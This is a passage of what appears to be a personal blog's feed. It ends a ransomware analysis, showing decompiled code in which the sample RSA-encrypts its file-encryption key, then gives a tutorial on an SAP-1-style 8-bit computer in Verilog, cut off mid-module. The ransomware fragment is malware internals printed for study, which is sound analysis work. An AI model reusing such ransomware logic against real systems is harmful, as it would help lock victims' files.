</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_public_encrypt</span>)(<span style="color:#e06c75">param_3</span>,<span style="color:#e06c75">param_2</span>,<span style="color:#56b6c2">*</span><span style="color:#e06c75">param_4</span>,<span style="color:#e06c75">param_1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;RSA_public_encrypt&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_5</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;encrypt_bytes: too big data&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_44</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So this function looks like it&rsquo;s encrypting the symmetric key using the RSA object that it generated before. We can see it in this line <code>iVar1 = (*lRSA_public_encrypt)(param_3,param_2,*param_4,param_1,1);</code>. <code>param_3</code> is <code>0x20</code> and <code>param_2</code> is the <code>sym_key_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_simple</span>(<span style="color:#e06c75">encrypt_file_buffer</span>,<span style="color:#e06c75">param_3</span>,<span style="color:#e06c75">param_4</span>,<span style="color:#e06c75">sym_key_buffer</span>,<span style="color:#d19a66">0x20</span>,<span style="color:#e06c75">param_5</span>);
</span></span></code></pre></div><p>Next, we can see that this is encrypting <code>encrypt_file_buffer</code> using the <code>sym_key_buffer</code>. So in this function, without jumping into it, we can already guess that this will take the symmetric key and use it to encrypt the file.</p>
<p>Looking in this function, there&rsquo;s just a lot of math code for encrypting. So my previous assumption is correct.</p>
<p>The rest of the code after this is error handling and writing the encrypted file to the original file.</p>
<p>So when it comes to decrypting the files, we need to use a private key. We need to derive a stream key from the private key and use that to decrypt the files.</p>
<h1 id="the-conclusion">The conclusion</h1>
<p>Well that was a long blog post. I tried to go over every important details.</p>
<p>I found the crazy thing about it is the fact that all the debugging information is still there in the binary. After analyzing this, I found that there&rsquo;s not really much you can do if you&rsquo;re a victim of this ransomware. Because it uses asymmetric encryption combined with a pseudo-random stream key, it pretty much forces any victim of this ransomware to pay.</p>
<p>Even after analyzing this ransomware, there&rsquo;s not really any information that I extracted from this analysis that could help a victim of attack. So call me crazy but I guess the malware author left the debugging information in there as a &ldquo;flex&rdquo;, because they knew that their malware was cryptographically secure.</p>
]]></content>
        </item>
        
        <item>
            <title>8-bit Computer in FPGA</title>
            <link>https://namberino.github.io/posts/2024/02/8-bit-computer-in-fpga/</link>
            <pubDate>Mon, 26 Feb 2024 10:01:26 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/02/8-bit-computer-in-fpga/</guid>
            <description>Computers are mysterious. These machines have always been so enigmatic to most people. I can guarantee that if you ask someone on the road how computers work, they would most likely just answer &amp;ldquo;I don&amp;rsquo;t know&amp;rdquo;.
I was like that for a long time, even after I started learning programming. So I decided that I will learn how a computer works by building one.
At first, I was thinking about building a breadboard computer like Ben Eater.</description>
            <content type="html"><![CDATA[<p>Computers are mysterious. These machines have always been so enigmatic to most people. I can guarantee that if you ask someone on the road how computers work, they would most likely just answer &ldquo;<em>I don&rsquo;t know</em>&rdquo;.</p>
<p>I was like that for a long time, even after I started learning programming. So I decided that I will learn how a computer works by building one.</p>
<p>At first, I was thinking about building a breadboard computer like <a href="https://www.youtube.com/playlist?list=PLowKtXNTBypGqImE405J2565dvjafglHU">Ben Eater</a>. But then I realized that I don&rsquo;t really have access to a lot of the components that Ben used where I live so I decided to make this computer using software, and since I just started learning <strong>Verilog</strong>, I decided to put my <strong>Verilog</strong> skill to the test by making this computer.</p>
<hr>
<h1 id="the-toolchain">The toolchain</h1>
<p>For this project, I decided to use some open source toolchain for FPGA. When I was doing some research, I found <a href="https://github.com/FPGAwars/apio"><em>Apio</em></a>, which is an open source ecosystem of FPGA tools, so I decided to use <em>Apio</em> for this project.</p>
<p>Here&rsquo;s how you install Apio:</p>
<ul>
<li>Install <a href="https://www.python.org/downloads/">Python</a></li>
<li>Install Apio with <code>pip</code> (if the <code>pip</code> command is not available, run <code>easy_install pip</code>)</li>
</ul>
<pre tabindex="0"><code>$ pip install -U apio
</code></pre><ul>
<li>Install necessary packages:</li>
</ul>
<pre tabindex="0"><code>$ apio install -a
</code></pre><p>Now you can use Apio for your project. Check out Apio&rsquo;s <a href="https://apiodoc.readthedocs.io/en/stable/source/quick_start.html">quick start</a> page to learn how to use it.</p>
<hr>
<h1 id="the-architecture">The architecture</h1>
<p>I based this computer&rsquo;s architecture on the <em>SAP-1</em> in <a href="https://www.amazon.com/Digital-Computer-Electronics-Jerald-Malvino-dp-0074622358/dp/0074622358/ref=dp_ob_image_bk">Digital Computer Electronics</a>.</p>
<p><img alt="8bit architecture pic" src="/img/8bit-computer/8bit-architecture.png"></p>
<p>The modules share some common signal path: <em>clk</em>, <em>rst</em> and <em>out</em>.</p>
<ul>
<li><em>clk</em>: The clock signal</li>
<li><em>rst</em>: The reset signal (resets everything back to 0)</li>
<li><em>out</em>: The output of each modules (connected to the bus for communication between modules)</li>
</ul>
<p>I combined the <em>MAR</em> module from the original <em>SAP-1</em> architecture with the <em>RAM</em> module to make the memory module. Some signals may also have different names as I&rsquo;m basing the architecture of this computer off of my memory of the <em>SAP-1</em> architecture.</p>
<p>This won&rsquo;t be an exact copy of the <em>SAP-1</em> but it&rsquo;s close enough and it&rsquo;s still a functioning 8-bit computer.</p>
<p>So let&rsquo;s get to making this computer.</p>
<hr>
<h1 id="the-components">The components</h1>
<p>Let&rsquo;s see how each components of the computer works:</p>
<ol>
<li><em>The bus</em>: This is where all the data is sent through. It is 8-bit wide and it is how components communicate with and send data to each other. The bus have <em>enable</em> signals that will allow it to multiplex between the different outputs of the modules.</li>
<li><em>The clock</em>: This module synchronizes all the components. Think of it like a conductor leading an orchestra. This component will output the <em>clk_in</em> signal if <em>hlt</em> is low, and output 0 if <em>hlt</em> is high. The <em>hlt</em> signal is used to implement the <strong>HLT</strong> instruction later on.</li>
<li><em>The program counter</em>: This module holds the next instruction to be executed. This module counts from <code>0x0</code> to <code>0xF</code> as there&rsquo;s only 16 bytes of memory in this computer. The <em>inc</em> signal tells this module to increment the value in itself by 1.</li>
<li><em>The instruction register</em>: This module loads the instruction from memory and seperates the opcode and the data. The upper 4 bits of the instruction is the opcode and the lower 4 bits is the address of the data. For the instructions that don&rsquo;t require data (like <strong>HLT</strong>), the lower 4 bits will be ignored.</li>
<li><em>The accumulator (A register)</em>: This is the main register of the computer. This stores the intermediate data during an execution. This needs a <em>load</em> signal to load values into it from the bus.</li>
<li><em>The B register</em>: This a buffer register used to perform arithmetic operations. It&rsquo;s basically a supporting register for the A register. It holds the number to be added to or subtracted from the A register. It also accepts a <em>load</em> signal to load values into it from the bus.</li>
<li><em>The adder</em>: This module is responsible for doing all the math in this computer. It can add (A + B) or subtract (A - B). It doesn&rsquo;t use the clock signal as it is constantly calculating and outputing the result based on the A and B values.</li>
<li><em>The memory</em>: There&rsquo;s 16 bytes of memory in this computer. The memory has a 4-bit register called the <em>Memory Address Register</em> or <em>MAR</em> for short, which temporarily holds a memory address of data or instruction in memory. This stored address is sent to the <em>RAM</em> where data and instructions are read from. It takes the computer 2 cycles to read from memory: 1st cycle will load an address from the bus into the <em>MAR</em>, 2nd cycle will use the value in the <em>MAR</em> to address into the <em>RAM</em> and output the value. This computer will initialize the memory by loading from a file called <em>program.bin</em></li>
<li><em>The controller</em>: This is the most complicated part about the computer. It will decide what the computer will do next by asserting different control signals in a 12-bit control word at different execution stages. We&rsquo;ll talk about the different control signals and execution stages later on.</li>
</ol>
<h1 id="the-execution-stages">The execution stages</h1>
<p>Instruction execution occurs in a series of <em>stages</em> (each stage takes 1 clock cycle). This computer has <strong>6</strong> stages (0 to 5). It counts up to 5 then goes back to 0 then continue (counts using a 3-bit register)</p>
<p>Opcode is passed from the <em>instruction register</em> into the <em>controller</em> to do things based on what instruction is. Output of the <em>controller</em> is the 12 control signals used to control all the other modules. Different stages of different instructions will assert different signals to accomplish different things.</p>
<p>Control signals:</p>
<ul>
<li><em>hlt</em>: halt execution</li>
<li><em>pc_inc</em>: increment program counter</li>
<li><em>pc_en</em>: put value of the pc onto the bus</li>
<li><em>mar_load</em>: load address into memory address register</li>
<li><em>mem_en</em>: put value from memory into the bus</li>
<li><em>ir_load</em>: load value from bus into intruction register</li>
<li><em>ir_en</em>: put value in ir onto the bus</li>
<li><em>a_load</em>: load value from bus into A register</li>
<li><em>a_en</em>: put value in A onto the bus</li>
<li><em>b_load</em>: load value from bus into B register</li>
<li><em>adder_sub</em>: subtract value in B from A</li>
<li><em>adder_en</em>: put value in adder onto the bus</li>
</ul>
<h1 id="the-instructions">The instructions</h1>
<p>This computer has 4 instructions:</p>
<table>
<thead>
<tr>
<th style="text-align:center">Opcode</th>
<th>Instruction</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><em>0000</em></td>
<td><strong>LDA $x</strong></td>
<td>Load value at memory location <em>$x</em> into A</td>
</tr>
<tr>
<td style="text-align:center"><em>0001</em></td>
<td><strong>ADD $x</strong></td>
<td>Add value at memory location <em>$x</em> with value in A and store the sum in A</td>
</tr>
<tr>
<td style="text-align:center"><em>0010</em></td>
<td><strong>SUB $x</strong></td>
<td>Subtract value at memory location <em>$x</em> from value in A and store the difference in A</td>
</tr>
<tr>
<td style="text-align:center"><em>1111</em></td>
<td><strong>HLT</strong></td>
<td>Halt program execution</td>
</tr>
</tbody>
</table>
<p>Every instruction has the same first 3 stages:</p>
<ul>
<li><strong>Stage 0</strong>: Put the <em>PC</em> onto bus and load that value into <em>MAR</em> (<em>pc_en</em> -&gt; <em>mar_load</em>)</li>
<li><strong>Stage 1</strong>: Increment <em>PC</em> (<em>pc_inc</em>)</li>
<li><strong>Stage 2</strong>: Put value in memory at the <em>MAR</em> address onto the bus and load that into the <em>IR</em> (<em>mem_en</em> -&gt; <em>ir_load</em>)</li>
</ul>
<p>Next 3 stages differs from instruction to instruction:</p>
<table>
<thead>
<tr>
<th>Stage</th>
<th>LDA</th>
<th>ADD</th>
<th>SUB</th>
<th>HLT</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Stage 3</strong></td>
<td>Put instruction operand onto the bus and load that value into MAR (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
<td>Put instruction operand onto the bus and load that value into MAR (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
<td>Put instruction operand onto the bus and load that value into MAR (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
<td>Halt the clock (<em>hlt</em>)</td>
</tr>
<tr>
<td><strong>Stage 4</strong></td>
<td>Put value in memory at the MAR address onto the bus and load that into the A register (<em>mem_en</em> -&gt; <em>a_load</em>)</td>
<td>Put value in memory at the MAR address onto the bus and load that into the B register (<em>mem_en</em> -&gt; <em>b_load</em>)</td>
<td>Put value in memory at the MAR address onto the bus and load that into the B register (<em>mem_en</em> -&gt; <em>b_load</em>)</td>
<td>Idle</td>
</tr>
<tr>
<td><strong>Stage 5</strong></td>
<td>Idle</td>
<td>Put value in the adder onto the bus and load that into the A register (<em>adder_en</em> -&gt; <em>a_load</em>)</td>
<td>Subtract then put the value in the adder onto the bus and load that into the A register (<em>adder_sub</em> -&gt; <em>adder_en</em> -&gt; <em>a_load</em>)</td>
<td>Idle</td>
</tr>
</tbody>
</table>
<h1 id="the-verilog-modules">The Verilog modules</h1>
<p>These modules will be programmed in <em>Verilog</em>. There will be a top module that will be used to connect all of these components together. There will also be a top module testbench to test out the design and check if the computer is working or not.</p>
<h2 id="the-clock">The clock</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">clock</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">hlt</span>, <span style="color:#7f848e">// halt signal
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk_in</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span> <span style="color:#e06c75">clk_out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">clk_out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">hlt</span> <span style="color:#56b6c2">?</span> <span style="color:#d19a66">1</span><span style="color:#d19a66">&#39;b0</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">clk_in</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-program-counter">The program counter</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">pc</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">inc</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">pc</span>;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">pc</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">4</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">inc</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">pc</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">pc</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pc</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-instruction-register">The instruction register</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">ir</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>, 
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">load</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">ir</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">ir</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">load</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">ir</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">ir</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-accumulator-a-register">The accumulator (A register)</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">reg_a</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">load</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">reg_a</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">reg_a</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">load</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">reg_a</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">reg_a</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-b-register">The B register</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">reg_b</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">load</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">reg_b</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">always</span> @ (<span style="color:#c678dd">posedge</span> <span style="color:#e06c75">clk</span>, <span style="color:#c678dd">posedge</span> <span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> (<span style="color:#e06c75">rst</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">reg_b</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#d19a66">8</span><span style="color:#d19a66">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span> <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">load</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">reg_b</span> <span style="color:#56b6c2">&lt;=</span> <span style="color:#e06c75">bus</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">reg_b</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-adder">The adder</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">adder</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">a</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">b</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">sub</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">assign</span> <span style="color:#e06c75">out</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">sub</span> <span style="color:#56b6c2">?</span> <span style="color:#e06c75">a</span> <span style="color:#56b6c2">-</span> <span style="color:#e06c75">b</span> <span style="color:#56b6c2">:</span> <span style="color:#e06c75">a</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">b</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c678dd">endmodule</span>
</span></span></code></pre></div><h2 id="the-memory">The memory</h2>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#c678dd">module</span> <span style="color:#e06c75">memory</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">clk</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">rst</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span> <span style="color:#e06c75">load</span>,
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">input</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">bus</span>,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">output</span>[<span style="color:#d19a66">7</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">out</span>
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#7f848e">// setting memory
</span></span></span><span style="display:flex;"><span><span style="color:#7f848e"></span>	<span style="color:#c678dd">initial</span> <span style="color:#c678dd">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#e5c07b">$readmemh</span>(<span style="color:#98c379">&#34;program.bin&#34;</span>, <span style="color:#e06c75">ram</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#e5c07b">reg</span>[<span style="color:#d19a66">3</span><span style="color:#56b6c2">:</span><span style="color:#d19a66">0</span>] <span style="color:#e06c75">mar</span>;
